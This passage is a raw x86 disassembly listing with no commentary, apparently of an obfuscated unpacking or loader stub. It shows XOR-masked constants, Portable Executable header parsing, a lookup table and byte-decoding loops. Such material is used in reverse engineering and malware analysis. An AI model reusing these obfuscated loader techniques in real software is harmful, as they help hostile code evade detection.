  428883:	sub    ecx,esi
  428885:	cmp    edi,ecx
  428887:	jbe    0x428833
  428889:	mov    eax,DWORD PTR [ebp-0x8]
  42888c:	pop    edi
  42888d:	mov    DWORD PTR [ebx],eax
  42888f:	mov    eax,DWORD PTR [ebp-0x8]
  428892:	pop    esi
  428893:	leave  
  428894:	ret    
  428895:	push   ebp
  428896:	mov    ebp,esp
  428898:	sub    esp,0x38
  42889b:	push   ebx
  42889c:	mov    ebx,0xf89c85a5
  4288a1:	mov    DWORD PTR [ebp-0x4],ebx
  4288a4:	lea    ecx,[ebx-0x3]
  4288a7:	mov    DWORD PTR [ebp-0x24],ecx
  4288aa:	mov    eax,DWORD PTR [ebp-0x4]
  4288ad:	mov    edx,DWORD PTR [ebp+0x8]
  4288b0:	push   esi
  4288b1:	mov    esi,0x75108ae
  4288b6:	xor    eax,esi
  4288b8:	push   edi
  4288b9:	mov    edi,0x3272f5
  4288be:	add    eax,edi
  4288c0:	cmp    edx,eax
  4288c2:	mov    eax,DWORD PTR [ebp-0x4]
  4288c5:	je     0x428a2a
  4288cb:	mov    edx,DWORD PTR [ebp+0xc]
  4288ce:	xor    eax,esi
  4288d0:	add    eax,edi
  4288d2:	cmp    edx,eax
  4288d4:	je     0x428a27
  4288da:	mov    eax,DWORD PTR [ebp+0x10]
  4288dd:	mov    edx,DWORD PTR [ebp+0xc]
  4288e0:	mov    DWORD PTR [ebp-0x14],eax
  4288e3:	mov    eax,DWORD PTR [ebp+0x8]
  4288e6:	mov    DWORD PTR [ebp-0x18],0xf89c853d
  4288ed:	mov    DWORD PTR [ebp-0xc],eax
  4288f0:	lea    eax,[ebx-0x2]
  4288f3:	mov    DWORD PTR [ebp-0x1c],eax
  4288f6:	mov    DWORD PTR [ebp-0x10],ebx
  4288f9:	mov    DWORD PTR [ebp+0xc],ecx
  4288fc:	mov    DWORD PTR [ebp+0x10],eax
  4288ff:	mov    eax,DWORD PTR [ebp+0xc]
  428902:	xor    eax,esi
  428904:	mov    DWORD PTR [ebp-0x20],edx
  428907:	sub    edx,eax
  428909:	sub    edx,edi
  42890b:	mov    DWORD PTR [ebp+0x8],edx
  42890e:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  428915:	jmp    0x428a17
  42891a:	mov    eax,DWORD PTR [ebp+0xc]
  42891d:	mov    ecx,DWORD PTR [ebp+0xc]
  428920:	xor    eax,esi
  428922:	xor    ecx,esi
  428924:	lea    ecx,[eax+ecx*1+0x64e5ea]
  42892b:	mov    eax,DWORD PTR [ebp+0x8]
  42892e:	xor    edx,edx
  428930:	div    ecx
  428932:	mov    eax,DWORD PTR [ebp+0x10]
  428935:	mov    ecx,DWORD PTR [ebp+0xc]
  428938:	xor    eax,esi
  42893a:	xor    ecx,esi
  42893c:	sub    eax,ecx
  42893e:	cmp    edx,eax
  428940:	jne    0x4289d6
  428946:	mov    eax,DWORD PTR [ebp+0x8]
  428949:	mov    ecx,DWORD PTR [ebp-0xc]
  42894c:	mov    dl,BYTE PTR [eax+ecx*1]
  42894f:	mov    eax,DWORD PTR [ebp-0x10]
  428952:	mov    ecx,DWORD PTR [ebp-0x8]
  428955:	xor    eax,esi
  428957:	xor    ecx,esi
  428959:	add    eax,edi
  42895b:	add    ecx,edi
  42895d:	cmp    eax,ecx
  42895f:	jae    0x4289a7
  428961:	lea    ecx,[eax-0x3272f5]
  428967:	mov    DWORD PTR [ebp-0x4],ecx
  42896a:	mov    ebx,DWORD PTR [ebp-0x4]
  42896d:	xor    ebx,esi
  42896f:	add    ebx,0x7f55d8e3
  428975:	lea    ecx,[ebp+eax*4-0x38]
  428979:	mov    DWORD PTR [ecx],ebx
  42897b:	mov    ebx,DWORD PTR [ecx]
  42897d:	cmp    ebx,0x244ecb80
  428983:	jbe    0x42898d
  428985:	add    DWORD PTR [ecx],0x405fcc1
  42898b:	jmp    0x428993
  42898d:	add    DWORD PTR [ecx],0xfdaf433f
  428993:	mov    ecx,DWORD PTR [ebp-0x8]
  428996:	xor    ecx,esi
  428998:	inc    eax
  428999:	inc    DWORD PTR [ebp-0x4]
  42899c:	add    ecx,edi
  42899e:	cmp    eax,ecx
  4289a0:	jb     0x42896a
  4289a2:	mov    ebx,0xf89c85a5
  4289a7:	cmp    DWORD PTR [ebp-0x14],0x0
  4289ab:	jne    0x4289b5
  4289ad:	xor    dl,0x7e
  4289b0:	add    dl,0x3
  4289b3:	jmp    0x4289cb
  4289b5:	mov    eax,DWORD PTR [ebp-0x18]
  4289b8:	xor    al,0xae
  4289ba:	mov    cl,0xb
  4289bc:	sub    cl,al
  4289be:	add    dl,cl
  4289c0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4289c3:	xor    cl,0xae
  4289c6:	sub    cl,0xb
  4289c9:	ror    dl,cl
  4289cb:	xor    eax,eax
  4289cd:	mov    eax,DWORD PTR [ebp+0x8]
  4289d0:	mov    ecx,DWORD PTR [ebp-0xc]
  4289d3:	mov    BYTE PTR [eax+ecx*1],dl
  4289d6:	mov    eax,DWORD PTR [ebp+0x8]
  4289d9:	mov    ecx,DWORD PTR [ebp-0x10]
  4289dc:	sub    eax,edi
  4289de:	xor    eax,esi
  4289e0:	cmp    eax,ecx
  4289e2:	jne    0x428a05
  4289e4:	mov    eax,DWORD PTR [ebp+0x10]
  4289e7:	mov    ecx,DWORD PTR [ebp+0xc]
  4289ea:	xor    eax,esi
  4289ec:	xor    ecx,esi
  4289ee:	sub    eax,ecx
  4289f0:	mov    ecx,DWORD PTR [ebp-0x20]
  4289f3:	sub    eax,edi
  4289f5:	xor    eax,esi
  4289f7:	mov    DWORD PTR [ebp+0x10],eax
  4289fa:	mov    eax,DWORD PTR [ebp+0xc]
  4289fd:	xor    eax,esi
  4289ff:	sub    ecx,eax
  428a01:	sub    ecx,edi
  428a03:	jmp    0x428a14
  428a05:	mov    eax,DWORD PTR [ebp+0xc]
  428a08:	xor    eax,esi
  428a0a:	mov    ecx,0xffcd8d0b
  428a0f:	sub    ecx,eax
  428a11:	add    ecx,DWORD PTR [ebp+0x8]
  428a14:	mov    DWORD PTR [ebp+0x8],ecx
  428a17:	mov    eax,DWORD PTR [ebp+0x10]
  428a1a:	cmp    eax,ebx
  428a1c:	jne    0x42891a
  428a22:	mov    eax,DWORD PTR [ebp-0x24]
  428a25:	jmp    0x428a2a
  428a27:	mov    eax,DWORD PTR [ebp-0x4]
  428a2a:	xor    eax,esi
  428a2c:	add    eax,edi
  428a2e:	pop    edi
  428a2f:	pop    esi
  428a30:	pop    ebx
  428a31:	leave  
  428a32:	ret    0xc
  428a35:	push   ebp
  428a36:	mov    ebp,esp
  428a38:	sub    esp,0x420
  428a3e:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  428a45:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  428a4c:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  428a53:	push   ebx
  428a54:	mov    DWORD PTR [ebp-0x1c],0xf89c85a4
  428a5b:	mov    eax,DWORD PTR [ebp-0x14]
  428a5e:	push   esi
  428a5f:	mov    esi,0x75108ae
  428a64:	push   edi
  428a65:	xor    eax,esi
  428a67:	mov    edi,0x3272f5
  428a6c:	add    eax,edi
  428a6e:	mov    DWORD PTR [ebp-0x8],eax
  428a71:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  428a78:	mov    DWORD PTR [ebp-0x4],0xead71885
  428a7f:	mov    DWORD PTR [ebp-0x10],0x8
  428a86:	mov    ecx,ecx
  428a88:	mov    eax,DWORD PTR [ebp-0xc]
  428a8b:	mov    ecx,DWORD PTR [ebp-0x14]
  428a8e:	xor    eax,esi
  428a90:	xor    ecx,esi
  428a92:	add    eax,edi
  428a94:	add    ecx,edi
  428a96:	imul   eax,ecx
  428a99:	jmp    0x428acc
  428a9b:	mov    eax,DWORD PTR [ebp-0x4]
  428a9e:	sub    eax,edi
  428aa0:	xor    eax,esi
  428aa2:	mov    DWORD PTR [ebp-0x8],eax
  428aa5:	lea    ebx,[ebp-0x8]
  428aa8:	call   0x4287ed
  428aad:	mov    DWORD PTR [ebp-0x8],eax
  428ab0:	mov    eax,DWORD PTR [ebp-0x8]
  428ab3:	mov    ecx,DWORD PTR [ebp-0x4]
  428ab6:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  428abd:	mov    eax,DWORD PTR [ebp-0xc]
  428ac0:	mov    ecx,DWORD PTR [ebp-0x4]
  428ac3:	xor    eax,esi
  428ac5:	lea    eax,[eax+ecx*1+0x3272f5]
  428acc:	mov    DWORD PTR [ebp-0x4],eax
  428acf:	mov    eax,DWORD PTR [ebp-0x18]
  428ad2:	mov    ecx,DWORD PTR [ebp-0xc]
  428ad5:	xor    ecx,esi
  428ad7:	xor    eax,esi
  428ad9:	sub    eax,ecx
  428adb:	mov    ecx,DWORD PTR [ebp-0x4]
  428ade:	cmp    ecx,eax
  428ae0:	jbe    0x428a9b
  428ae2:	mov    eax,DWORD PTR [ebp-0x1c]
  428ae5:	xor    eax,esi
  428ae7:	add    eax,edi
  428ae9:	mov    DWORD PTR [ebp-0x8],eax
  428aec:	mov    DWORD PTR [ebp-0x18],0xf89c86a4
  428af3:	mov    ebx,ebx
  428af5:	jmp    0x428b58
  428af7:	mov    ecx,DWORD PTR [ebp-0x20]
  428afa:	mov    eax,DWORD PTR [ebp-0x8]
  428afd:	xor    ecx,esi
  428aff:	add    ecx,edi
  428b01:	shr    eax,cl
  428b03:	mov    DWORD PTR [ebp-0x4],eax
  428b06:	mov    eax,DWORD PTR [ebp+0x8]
  428b09:	mov    cl,BYTE PTR [eax]
  428b0b:	mov    BYTE PTR [ebp+0xb],cl
  428b0e:	mov    cl,BYTE PTR [ebp+0xb]
  428b11:	mov    edx,DWORD PTR [ebp-0x8]
  428b14:	movzx  ecx,cl
  428b17:	xor    ecx,edx
  428b19:	mov    DWORD PTR [ebp+0x8],ecx
  428b1c:	mov    ecx,DWORD PTR [ebp-0x18]
  428b1f:	mov    edx,DWORD PTR [ebp+0x8]
  428b22:	xor    ecx,esi
  428b24:	add    ecx,edi
  428b26:	and    ecx,edx
  428b28:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  428b2f:	mov    edx,DWORD PTR [ebp-0x4]
  428b32:	xor    ecx,edx
  428b34:	mov    DWORD PTR [ebp-0x8],ecx
  428b37:	mov    ecx,DWORD PTR [ebp-0xc]
  428b3a:	xor    ecx,esi
  428b3c:	lea    eax,[eax+ecx*1+0x3272f5]
  428b43:	mov    DWORD PTR [ebp+0x8],eax
  428b46:	mov    eax,DWORD PTR [ebp-0xc]
  428b49:	xor    eax,esi
  428b4b:	mov    ecx,0xffcd8d0b
  428b50:	sub    ecx,eax
  428b52:	add    ecx,DWORD PTR [ebp-0x10]
  428b55:	mov    DWORD PTR [ebp-0x10],ecx
  428b58:	mov    eax,DWORD PTR [ebp-0x14]
  428b5b:	mov    ecx,DWORD PTR [ebp-0x10]
  428b5e:	xor    eax,esi
  428b60:	add    eax,edi
  428b62:	cmp    ecx,eax
  428b64:	jne    0x428af7
  428b66:	mov    eax,DWORD PTR [ebp-0x1c]
  428b69:	mov    ecx,DWORD PTR [ebp-0x8]
  428b6c:	xor    eax,esi
  428b6e:	add    eax,edi
  428b70:	pop    edi
  428b71:	pop    esi
  428b72:	xor    eax,ecx
  428b74:	pop    ebx
  428b75:	leave  
  428b76:	ret    0x4
  428b79:	push   ebp
  428b7a:	mov    ebp,esp
  428b7c:	mov    eax,DWORD PTR [ebp+0x1c]
  428b7f:	mov    ecx,DWORD PTR [ebp+0x8]
  428b82:	mov    edx,DWORD PTR [ebp+0x10]
  428b85:	mov    eax,DWORD PTR [eax+0x190]
  428b8b:	mov    eax,DWORD PTR [eax]
  428b8d:	sub    esp,0x64
  428b90:	push   ebx
  428b91:	push   esi
  428b92:	push   edi
  428b93:	mov    edi,0x75108ae
  428b98:	xor    ecx,edi
  428b9a:	mov    ebx,0x3272f5
  428b9f:	add    ecx,ebx
  428ba1:	cmp    ecx,edx
  428ba3:	jne    0x428bb4
  428ba5:	or     DWORD PTR ds:0x3750c3f,0x4263eb2c
  428baf:	jmp    0x4290b0
  428bb4:	mov    ecx,DWORD PTR [ebp+0x8]
  428bb7:	mov    esi,DWORD PTR [ebp+0x14]
  428bba:	mov    edx,DWORD PTR [esi]
  428bbc:	xor    ecx,edi
  428bbe:	add    ecx,ebx
  428bc0:	cmp    edx,ecx
  428bc2:	je     0x42906b
  428bc8:	mov    ecx,DWORD PTR [ebp+0x1c]
  428bcb:	mov    DWORD PTR [ebp-0x1c],eax
  428bce:	mov    DWORD PTR [ebp+0x1c],ecx
  428bd1:	mov    ecx,DWORD PTR [ebp+0x18]
  428bd4:	mov    eax,DWORD PTR [esi]
  428bd6:	mov    DWORD PTR [ebp-0x20],eax
  428bd9:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  428be0:	mov    edx,0xf89c85a2
  428be5:	mov    DWORD PTR [ebp-0x8],edx
  428be8:	mov    eax,DWORD PTR [ebp+0x1c]
  428beb:	mov    DWORD PTR [ebp+0x1c],eax
  428bee:	mov    eax,DWORD PTR [ebp+0x1c]
  428bf1:	mov    eax,DWORD PTR [eax+0x190]
  428bf7:	mov    eax,DWORD PTR [eax]
  428bf9:	mov    DWORD PTR [ebp-0x24],ecx
  428bfc:	mov    ecx,DWORD PTR [ebp+0x1c]
  428bff:	mov    ecx,DWORD PTR [ecx+0x190]
  428c05:	mov    ecx,DWORD PTR [ecx]
  428c07:	add    ecx,DWORD PTR [eax+0x3c]
  428c0a:	mov    DWORD PTR [ebp+0x10],ecx
  428c0d:	mov    eax,DWORD PTR [ebp+0x8]
  428c10:	xor    eax,edi
  428c12:	add    eax,ebx
  428c14:	mov    DWORD PTR [ebp-0x4],eax
  428c17:	mov    eax,DWORD PTR [ebp+0x8]
  428c1a:	xor    eax,edi
  428c1c:	add    eax,ebx
  428c1e:	mov    DWORD PTR [ebp+0x18],eax
  428c21:	mov    eax,DWORD PTR [ebp+0x10]
  428c24:	mov    eax,DWORD PTR [eax+0x50]
  428c27:	sub    eax,0xc
  428c2a:	mov    DWORD PTR [ebp-0x28],eax
  428c2d:	mov    eax,DWORD PTR [ebp+0x10]
  428c30:	mov    eax,DWORD PTR [eax+0x38]
  428c33:	mov    ecx,DWORD PTR [ebp+0x10]
  428c36:	dec    eax
  428c37:	test   DWORD PTR [ecx+0x54],eax
  428c3a:	mov    eax,DWORD PTR [ebp+0x10]
  428c3d:	je     0x428c57
  428c3f:	mov    eax,DWORD PTR [eax+0x38]
  428c42:	mov    ecx,DWORD PTR [ebp+0x10]
  428c45:	mov    ecx,DWORD PTR [ecx+0x54]
  428c48:	dec    eax
  428c49:	not    eax
  428c4b:	and    ecx,eax
  428c4d:	mov    eax,DWORD PTR [ebp+0x10]
  428c50:	mov    eax,DWORD PTR [eax+0x38]
  428c53:	add    eax,ecx
  428c55:	jmp    0x428c5a
  428c57:	mov    eax,DWORD PTR [eax+0x54]
  428c5a:	mov    DWORD PTR [ebp+0x1c],eax
  428c5d:	mov    eax,DWORD PTR [ebp+0x8]
  428c60:	xor    eax,edi
  428c62:	add    eax,ebx
  428c64:	mov    DWORD PTR [ebp+0x18],eax
  428c67:	mov    eax,DWORD PTR [ebp+0x8]
  428c6a:	xor    eax,edi
  428c6c:	add    eax,ebx
  428c6e:	mov    DWORD PTR [ebp+0x18],eax
  428c71:	mov    eax,DWORD PTR [ebp+0x8]
  428c74:	mov    ecx,DWORD PTR [ebp-0x24]
  428c77:	xor    eax,edi
  428c79:	add    eax,ebx
  428c7b:	mov    DWORD PTR [ecx],eax
  428c7d:	mov    DWORD PTR [ebp+0x18],edx
  428c80:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  428c87:	mov    DWORD PTR [ebp+0x18],0xf89c85a0
  428c8e:	mov    DWORD PTR [ebp+0x18],0xf89c85a1
  428c95:	mov    eax,DWORD PTR [ebp-0x8]
  428c98:	mov    ecx,DWORD PTR [ebp+0x1c]
  428c9b:	xor    eax,edi
  428c9d:	add    eax,ebx
  428c9f:	imul   eax,ecx
  428ca2:	mov    ecx,DWORD PTR [ebp+0x8]
  428ca5:	mov    edx,DWORD PTR [ebp-0x28]
  428ca8:	xor    ecx,edi
  428caa:	lea    ecx,[ecx+edx*1+0x3272f5]
  428cb1:	cmp    eax,ecx
  428cb3:	jae    0x429064
  428cb9:	mov    eax,DWORD PTR [ebp+0x8]
  428cbc:	xor    eax,edi
  428cbe:	add    eax,ebx
  428cc0:	mov    DWORD PTR [ebp+0x18],eax
  428cc3:	mov    eax,DWORD PTR [ebp+0x1c]
  428cc6:	add    eax,DWORD PTR [ebp-0x1c]
  428cc9:	mov    DWORD PTR [ebp-0x4],eax
  428ccc:	push   DWORD PTR [ebp-0x4]
  428ccf:	mov    esi,DWORD PTR [ebp-0x1c]
  428cd2:	mov    ecx,DWORD PTR [ebp+0x10]
  428cd5:	call   0x427e25
  428cda:	mov    DWORD PTR [ebp+0xc],eax
  428cdd:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  428ce4:	mov    eax,DWORD PTR [ebp-0x18]
  428ce7:	xor    eax,edi
  428ce9:	lea    ecx,[ebp-0x40]
  428cec:	add    eax,ebx
  428cee:	push   ecx
  428cef:	call   0x4283b9
  428cf4:	mov    eax,DWORD PTR [ebp+0xc]
  428cf7:	test   eax,eax
  428cf9:	je     0x428d49
  428cfb:	mov    eax,DWORD PTR [ebp-0x18]
  428cfe:	xor    eax,edi
  428d00:	add    eax,ebx
  428d02:	push   eax
  428d03:	push   DWORD PTR [ebp+0xc]
  428d06:	lea    eax,[ebp-0x40]
  428d09:	push   eax
  428d0a:	call   0x4282af
  428d0f:	mov    eax,DWORD PTR [ebp-0x4]
  428d12:	mov    DWORD PTR [ebp-0x18],eax
  428d15:	mov    eax,DWORD PTR [ebp-0x18]
  428d18:	mov    ecx,DWORD PTR [ebp-0x1c]
  428d1b:	sub    eax,ecx
  428d1d:	mov    DWORD PTR [ebp-0x18],eax
  428d20:	mov    eax,DWORD PTR [ebp+0xc]
  428d23:	mov    ecx,DWORD PTR [ebp+0xc]
  428d26:	mov    eax,DWORD PTR [eax+0x10]
  428d29:	add    eax,DWORD PTR [ecx+0xc]
  428d2c:	mov    ecx,DWORD PTR [ebp-0x18]
  428d2f:	cmp    ecx,eax
  428d31:	jb     0x428d49
  428d33:	mov    eax,DWORD PTR [ebp+0xc]
  428d36:	mov    eax,DWORD PTR [eax+0xc]
  428d39:	mov    ecx,DWORD PTR [ebp+0xc]
  428d3c:	add    eax,DWORD PTR [ecx+0x8]
  428d3f:	mov    ecx,DWORD PTR [ebp-0x18]
  428d42:	sub    eax,ecx
  428d44:	jmp    0x429037
  428d49:	push   0xc
  428d4b:	push   DWORD PTR [ebp-0x4]
  428d4e:	lea    eax,[ebp-0x4c]
  428d51:	push   eax
  428d52:	call   0x4282af
  428d57:	mov    eax,0xf89c85a5
  428d5c:	mov    DWORD PTR [ebp-0x2c],eax
  428d5f:	mov    DWORD PTR [ebp-0x30],0xf89c85a2
  428d66:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  428d6d:	mov    DWORD PTR [ebp-0x38],0xf89c85a0
  428d74:	lea    ecx,[ebp-0x2c]
  428d77:	mov    DWORD PTR [ebp-0xc],ecx
  428d7a:	lea    ecx,[ebp-0x30]
  428d7d:	mov    DWORD PTR [ebp-0x10],ecx
  428d80:	lea    ecx,[ebp-0x34]
  428d83:	mov    DWORD PTR [ebp+0xc],ecx
  428d86:	lea    ecx,[ebp-0x38]
  428d89:	mov    DWORD PTR [ebp-0x14],ecx
  428d8c:	mov    ecx,DWORD PTR [ebp+0x8]
  428d8f:	xor    ecx,edi
  428d91:	add    ecx,ebx
  428d93:	mov    DWORD PTR [ebp-0x18],ecx
  428d96:	jmp    0x428f92
  428d9b:	cmp    eax,0xf89c85a3
  428da0:	je     0x428fa4
  428da6:	mov    ecx,DWORD PTR [ebp-0x8]
  428da9:	xor    ecx,edi
  428dab:	mov    esi,eax
  428dad:	add    ecx,ebx
  428daf:	mov    DWORD PTR [ebp+0x18],ecx
  428db2:	mov    eax,DWORD PTR [ebp-0x18]
  428db5:	xor    esi,edi
  428db7:	lea    eax,[eax+esi*1+0x3272f5]
  428dbe:	mov    DWORD PTR [ebp-0x18],eax
  428dc1:	mov    eax,DWORD PTR [ebp-0x8]
  428dc4:	mov    ecx,DWORD PTR [ebp-0x18]
  428dc7:	xor    eax,edi
  428dc9:	add    eax,ebx
  428dcb:	cmp    ecx,eax
  428dcd:	jne    0x428de2
  428dcf:	mov    eax,DWORD PTR [ebp+0x8]
  428dd2:	xor    eax,edi
  428dd4:	add    eax,ebx
  428dd6:	push   eax
  428dd7:	push   0xc
  428dd9:	lea    eax,[ebp-0x4c]
  428ddc:	push   eax
  428ddd:	call   0x428895
  428de2:	mov    eax,DWORD PTR [ebp-0xc]
  428de5:	mov    eax,DWORD PTR [eax]
  428de7:	xor    eax,edi
  428de9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428df0:	mov    ecx,DWORD PTR [ebp+0x8]
  428df3:	xor    ecx,edi
  428df5:	movzx  eax,al
  428df8:	add    ecx,ebx
  428dfa:	cmp    eax,ecx
  428dfc:	je     0x428f7a
  428e02:	mov    eax,DWORD PTR [ebp-0x10]
  428e05:	mov    eax,DWORD PTR [eax]
  428e07:	xor    eax,edi
  428e09:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e10:	mov    ecx,DWORD PTR [ebp+0x8]
  428e13:	xor    ecx,edi
  428e15:	movzx  eax,al
  428e18:	add    ecx,ebx
  428e1a:	cmp    eax,ecx
  428e1c:	je     0x428f7a
  428e22:	mov    eax,DWORD PTR [ebp+0xc]
  428e25:	mov    eax,DWORD PTR [eax]
  428e27:	xor    eax,edi
  428e29:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e30:	mov    ecx,DWORD PTR [ebp+0x8]
  428e33:	xor    ecx,edi
  428e35:	movzx  eax,al
  428e38:	add    ecx,ebx
  428e3a:	cmp    eax,ecx
  428e3c:	je     0x428f7a
  428e42:	mov    eax,DWORD PTR [ebp-0x14]
  428e45:	mov    eax,DWORD PTR [eax]
  428e47:	xor    eax,edi
  428e49:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e50:	mov    ecx,DWORD PTR [ebp+0x8]
  428e53:	xor    ecx,edi
  428e55:	movzx  eax,al
  428e58:	add    ecx,ebx
  428e5a:	cmp    eax,ecx
  428e5c:	je     0x428f7a
  428e62:	mov    eax,DWORD PTR [ebp-0x10]
  428e65:	mov    eax,DWORD PTR [eax]
  428e67:	xor    eax,edi
  428e69:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e70:	mov    ecx,DWORD PTR [ebp-0xc]
  428e73:	mov    ecx,DWORD PTR [ecx]
  428e75:	xor    ecx,edi
  428e77:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428e7e:	xor    al,cl
  428e80:	mov    ecx,DWORD PTR [ebp+0xc]
  428e83:	mov    ecx,DWORD PTR [ecx]
  428e85:	xor    ecx,edi
  428e87:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428e8e:	or     al,cl
  428e90:	mov    ecx,DWORD PTR [ebp-0xc]
  428e93:	mov    ecx,DWORD PTR [ecx]
  428e95:	xor    ecx,edi
  428e97:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428e9e:	cmp    cl,al
  428ea0:	jne    0x428f7a
  428ea6:	mov    eax,DWORD PTR [ebp+0xc]
  428ea9:	mov    eax,DWORD PTR [eax]
  428eab:	xor    eax,edi
  428ead:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428eb4:	mov    ecx,DWORD PTR [ebp-0x10]
  428eb7:	mov    ecx,DWORD PTR [ecx]
  428eb9:	xor    ecx,edi
  428ebb:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428ec2:	xor    al,cl
  428ec4:	mov    ecx,DWORD PTR [ebp-0x14]
  428ec7:	mov    ecx,DWORD PTR [ecx]
  428ec9:	xor    ecx,edi
  428ecb:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428ed2:	or     al,cl
  428ed4:	mov    ecx,DWORD PTR [ebp-0x10]
  428ed7:	mov    ecx,DWORD PTR [ecx]
  428ed9:	xor    ecx,edi
  428edb:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428ee2:	cmp    cl,al
  428ee4:	jne    0x428f7a
  428eea:	mov    eax,DWORD PTR [ebp-0x14]
  428eed:	mov    eax,DWORD PTR [eax]
  428eef:	xor    eax,edi
  428ef1:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428ef8:	mov    ecx,DWORD PTR [ebp+0xc]
  428efb:	mov    ecx,DWORD PTR [ecx]
  428efd:	xor    ecx,edi
  428eff:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428f06:	xor    al,cl
  428f08:	mov    ecx,DWORD PTR [ebp-0xc]
  428f0b:	mov    ecx,DWORD PTR [ecx]
  428f0d:	xor    ecx,edi
  428f0f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428f16:	or     al,cl
  428f18:	mov    ecx,DWORD PTR [ebp+0xc]
  428f1b:	mov    ecx,DWORD PTR [ecx]
  428f1d:	xor    ecx,edi
  428f1f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428f26:	cmp    cl,al
  428f28:	jne    0x428f7a
  428f2a:	mov    eax,DWORD PTR [ebp-0x14]
  428f2d:	mov    eax,DWORD PTR [eax]
  428f2f:	xor    eax,edi
  428f31:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428f38:	mov    ecx,DWORD PTR [ebp-0xc]
  428f3b:	mov    ecx,DWORD PTR [ecx]
  428f3d:	xor    ecx,edi
  428f3f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428f46:	xor    al,cl
  428f48:	mov    ecx,DWORD PTR [ebp-0x10]
  428f4b:	mov    ecx,DWORD PTR [ecx]
  428f4d:	xor    ecx,edi
  428f4f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428f56:	or     al,cl
  428f58:	mov    ecx,DWORD PTR [ebp-0x14]
  428f5b:	mov    ecx,DWORD PTR [ecx]
  428f5d:	xor    ecx,edi
  428f5f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428f66:	cmp    cl,al
  428f68:	jne    0x428f7a
  428f6a:	lea    eax,[ebp-0x4c]
  428f6d:	push   eax
  428f6e:	call   0x428a35
  428f73:	mov    ecx,DWORD PTR [ebp-0x44]
  428f76:	cmp    eax,ecx
  428f78:	je     0x428f84
  428f7a:	mov    eax,DWORD PTR [ebp+0x8]
  428f7d:	xor    eax,edi
  428f7f:	add    eax,ebx
  428f81:	mov    DWORD PTR [ebp+0x18],eax
  428f84:	mov    eax,DWORD PTR [ebp-0x8]
  428f87:	xor    eax,edi
  428f89:	lea    eax,[eax+esi*1+0x3272f5]
  428f90:	xor    eax,edi
  428f92:	mov    ecx,DWORD PTR [ebp+0x8]
  428f95:	mov    edx,DWORD PTR [ebp+0x18]
  428f98:	xor    ecx,edi
  428f9a:	add    ecx,ebx
  428f9c:	cmp    edx,ecx
  428f9e:	je     0x428d9b
  428fa4:	mov    eax,DWORD PTR [ebp+0x8]
  428fa7:	mov    ecx,DWORD PTR [ebp+0x18]
  428faa:	xor    eax,edi
  428fac:	add    eax,ebx
  428fae:	cmp    ecx,eax
  428fb0:	jne    0x428fc3
  428fb2:	mov    eax,DWORD PTR [ebp-0x8]
  428fb5:	mov    ecx,DWORD PTR [ebp+0x1c]
  428fb8:	xor    eax,edi
  428fba:	lea    eax,[eax+ecx*1+0x3272f5]
  428fc1:	jmp    0x42903a
  428fc3:	push   0x18
  428fc5:	push   DWORD PTR [ebp-0x4]
  428fc8:	lea    eax,[ebp-0x64]
  428fcb:	push   eax
  428fcc:	call   0x4282af
  428fd1:	mov    eax,DWORD PTR [ebp+0x8]
  428fd4:	mov    ecx,DWORD PTR [ebp-0x18]
  428fd7:	xor    eax,edi
  428fd9:	add    eax,ebx
  428fdb:	cmp    eax,ecx
  428fdd:	je     0x428ff2
  428fdf:	mov    eax,DWORD PTR [ebp+0x8]
  428fe2:	xor    eax,edi
  428fe4:	add    eax,ebx
  428fe6:	push   eax
  428fe7:	push   0x18
  428fe9:	lea    eax,[ebp-0x64]
  428fec:	push   eax
  428fed:	call   0x428895
  428ff2:	mov    eax,DWORD PTR [ebp-0x4]
  428ff5:	add    eax,0x18
  428ff8:	mov    DWORD PTR [ebp+0x18],eax
  428ffb:	push   DWORD PTR [ebp-0x50]
  428ffe:	push   DWORD PTR [ebp+0x18]
  429001:	mov    eax,DWORD PTR [ebp-0x54]
  429004:	add    eax,DWORD PTR [ebp-0x20]
  429007:	push   eax
  429008:	call   0x4282af
  42900d:	mov    eax,DWORD PTR [ebp+0x8]
  429010:	mov    ecx,DWORD PTR [ebp-0x18]
  429013:	xor    eax,edi
  429015:	add    eax,ebx
  429017:	cmp    eax,ecx
  429019:	je     0x42902c
  42901b:	push   0x0
  42901d:	push   DWORD PTR [ebp-0x50]
  429020:	mov    eax,DWORD PTR [ebp-0x54]
  429023:	add    eax,DWORD PTR [ebp-0x20]
  429026:	push   eax
  429027:	call   0x428895
  42902c:	mov    eax,DWORD PTR [ebp-0x24]
  42902f:	mov    ecx,DWORD PTR [ebp-0x50]
  429032:	add    DWORD PTR [eax],ecx
  429034:	mov    eax,DWORD PTR [ebp-0x50]
  429037:	add    eax,DWORD PTR [ebp+0x1c]
  42903a:	mov    DWORD PTR [ebp+0x1c],eax
